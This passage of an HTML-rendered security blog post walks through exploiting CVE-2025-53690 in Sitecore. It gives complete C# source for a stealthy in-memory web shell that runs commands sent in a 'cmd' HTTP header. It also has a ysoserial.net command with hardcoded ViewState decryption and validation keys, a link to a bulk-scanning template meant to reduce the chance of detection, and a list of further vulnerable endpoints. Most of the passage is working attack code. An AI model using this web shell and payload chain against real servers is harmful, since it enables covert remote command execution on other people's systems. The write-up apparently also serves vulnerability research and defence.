&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;RouteTable.Routes.Insert(0, new MyRoute());
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Here, instead of using &lt;code&gt;Routes.Add&lt;/code&gt;, we use &lt;code&gt;Routes.Insert&lt;/code&gt; because:&lt;/p&gt;
&lt;p&gt;When using &lt;code&gt;Routes.Insert&lt;/code&gt;, we can &lt;strong&gt;control the position&lt;/strong&gt; where this route is inserted into the &lt;code&gt;RouteTable&lt;/code&gt;. When using &lt;code&gt;**Insert(0, â€¦)**&lt;/code&gt;, this route will be &lt;strong&gt;placed at the top&lt;/strong&gt; of the &lt;code&gt;RouteTable&lt;/code&gt; â‡’ our custom route logic will be &lt;strong&gt;processed first&lt;/strong&gt; when the pipeline loops through the &lt;code&gt;RouteTable&lt;/code&gt; to find a matching route.&lt;/p&gt;
&lt;p&gt;From there, we can &lt;strong&gt;leverage this mechanism&lt;/strong&gt; to &lt;strong&gt;inject malicious payloads&lt;/strong&gt; (execute commands, read files, etc.) directly into the &lt;code&gt;GetRouteData&lt;/code&gt; method of the route we define.&lt;/p&gt;
&lt;p&gt;The Payload file is as follows:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;span class="lnt"&gt;33
&lt;/span&gt;&lt;span class="lnt"&gt;34
&lt;/span&gt;&lt;span class="lnt"&gt;35
&lt;/span&gt;&lt;span class="lnt"&gt;36
&lt;/span&gt;&lt;span class="lnt"&gt;37
&lt;/span&gt;&lt;span class="lnt"&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;// ExploitClass was renamed to E to reduce the size a little bit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Web&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="nn"&gt;System.Web.Routing&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;E&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="n"&gt;E&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;RouteCollection&lt;/span&gt; &lt;span class="n"&gt;routes&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;RouteTable&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Routes&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;routes&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RouteBase&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;MyRoute&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;End&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MyRoute&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;RouteBase&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;RouteData&lt;/span&gt; &lt;span class="n"&gt;GetRouteData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpContextBase&lt;/span&gt; &lt;span class="n"&gt;httpContext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;Payload&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;httpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;cmd&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Payload&lt;/span&gt; &lt;span class="p"&gt;!=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Diagnostics&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Diagnostics&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Process&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FileName&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd.exe&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Arguments&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;/c &amp;#34;&lt;/span&gt; &lt;span class="p"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Payload&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UseShellExecute&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardOutput&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RedirectStandardError&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StartInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateNoWindow&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Start&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;string&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;StandardOutput&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ReadToEnd&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Web&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HttpContext&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Current&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Response&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;End&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;override&lt;/span&gt; &lt;span class="n"&gt;VirtualPathData&lt;/span&gt; &lt;span class="n"&gt;GetVirtualPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;RequestContext&lt;/span&gt; &lt;span class="n"&gt;requestContext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;RouteValueDictionary&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Explanation of the payload above:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here, we create a &lt;code&gt;MyRoute&lt;/code&gt; class that contains the command execution payload inside the &lt;code&gt;GetRouteData&lt;/code&gt; method. This method checks if the request header contains a &lt;code&gt;cmd&lt;/code&gt; header. If it does, it will execute the &lt;code&gt;cmd&lt;/code&gt; command based on the value of that header. If the header is not present, it skips and returns null â‡’ &lt;strong&gt;does not affect the logic of other routes&lt;/strong&gt;, and the application continues to function normally â‡’ &lt;strong&gt;much harder to detect&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;In reality, both GetRouteData and GetVirtualPath methods can be used to execute arbitrary code. However, in the request pipeline, &lt;strong&gt;GetRouteData is executed before GetVirtualPath&lt;/strong&gt;, so we will use GetRouteData here.&lt;/p&gt;
&lt;p&gt;Then, in the E class, we initialize a &lt;strong&gt;RouteCollection&lt;/strong&gt; object and &lt;strong&gt;insert MyRoute into the RouteTable at the very first position&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Save the above file as &lt;strong&gt;MemShellClass.cs&lt;/strong&gt; in the ysoserial.net directory. Then run the following command to generate the payload:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ysoserial&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;ViewState&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;g&lt;/span&gt; &lt;span class="n"&gt;XamlAssemblyLoadFromFile&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;MemShellClass.cs;System.Web.dll;System.dll&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;--&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;blocked&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt; &lt;span class="p"&gt;--&lt;/span&gt;&lt;span class="n"&gt;decryptionkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;0DAC68D020B8193DF0FCEE1BAF7A07B4B0D40DCD3E5BA90D&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;--&lt;/span&gt;&lt;span class="n"&gt;validationalg&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;--&lt;/span&gt;&lt;span class="n"&gt;validationkey&lt;/span&gt;&lt;span class="p"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;BDDFE367CD36AAA81E195761BEFB073839549FF7B8E34E42C0DEA4600851B0065856B211719ADEFC76F3F3A556BC61A5FC8C9F28F958CB1D3BD8EF9518143DB6&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;After sending the payload, we receive a &lt;strong&gt;200 response&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image41.png"
width="3164"
height="1653"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image41_hu_8d138877573e97f9.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image41_hu_e9f55f2e0a474d10.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="459px"
&gt;&lt;/p&gt;
&lt;p&gt;Now, we can send a request to &lt;strong&gt;any route&lt;/strong&gt; and set the &lt;strong&gt;&lt;code&gt;cmd&lt;/code&gt; header&lt;/strong&gt; to the payload we want to execute in order to run &lt;strong&gt;arbitrary commands&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image42.png"
width="3176"
height="1666"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image42_hu_9d8f229079a879.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image42_hu_eca8a16222818efe.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="190"
data-flex-basis="457px"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id="honorable-mention"&gt;Honorable Mention
&lt;/h3&gt;&lt;p&gt;From the basic payload that only modifies the &lt;strong&gt;Response Header&lt;/strong&gt;, we can create a &lt;strong&gt;Nuclei template&lt;/strong&gt; to &lt;strong&gt;scan in bulk&lt;/strong&gt; by sending the generated &lt;strong&gt;VIEWSTATE&lt;/strong&gt; and checking if the response contains the string we define.&lt;/p&gt;
&lt;p&gt;The template is available here: &lt;strong&gt;&lt;a class="link" href="https://github.com/ErikLearningSec/CVE-2025-53690-POC" target="_blank" rel="noopener"
&gt;https://github.com/ErikLearningSec/CVE-2025-53690-POC&lt;/a&gt;&lt;/strong&gt;
In this template, we&amp;rsquo;ll write it a bit differently. Instead of exploiting via the endpoint &lt;code&gt;/blocked.aspx&lt;/code&gt;, we&amp;rsquo;ll exploit via the endpoint &lt;code&gt;/sitecore/default.aspx&lt;/code&gt; because this is an endpoint that always exists on Sitecore instances â‡’ increasing the scan hit rate and reducing the chance of detection.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/nuclei.png"
width="799"
height="351"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/nuclei_hu_aabb80112929c502.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/nuclei_hu_16e538bb28146877.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="227"
data-flex-basis="546px"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id="honorable-mention-2"&gt;Honorable Mention #2
&lt;/h3&gt;&lt;p&gt;Although the entire analysis focuses on attacking the &lt;strong&gt;&lt;code&gt;/sitecore/blocked.aspx&lt;/code&gt;&lt;/strong&gt; endpoint as mentioned in &lt;strong&gt;Mandiant&amp;rsquo;s blog&lt;/strong&gt;, we can also exploit &lt;strong&gt;other endpoints&lt;/strong&gt;, as long as they are &lt;strong&gt;unauthenticated&lt;/strong&gt; and &lt;strong&gt;contain VIEWSTATE in the response&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;After listing &lt;code&gt;.aspx&lt;/code&gt; files in the &lt;strong&gt;webroot&lt;/strong&gt; and fuzzing with &lt;strong&gt;Intruder&lt;/strong&gt;, we obtained the following list:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;span class="lnt"&gt;22
&lt;/span&gt;&lt;span class="lnt"&gt;23
&lt;/span&gt;&lt;span class="lnt"&gt;24
&lt;/span&gt;&lt;span class="lnt"&gt;25
&lt;/span&gt;&lt;span class="lnt"&gt;26
&lt;/span&gt;&lt;span class="lnt"&gt;27
&lt;/span&gt;&lt;span class="lnt"&gt;28
&lt;/span&gt;&lt;span class="lnt"&gt;29
&lt;/span&gt;&lt;span class="lnt"&gt;30
&lt;/span&gt;&lt;span class="lnt"&gt;31
&lt;/span&gt;&lt;span class="lnt"&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-csharp" data-lang="csharp"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;Sample&lt;/span&gt; &lt;span class="n"&gt;layout&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;VIChecker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;layouts&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;VisitorIdentificationCss&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sitecore&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;aspx&lt;/span&gt;
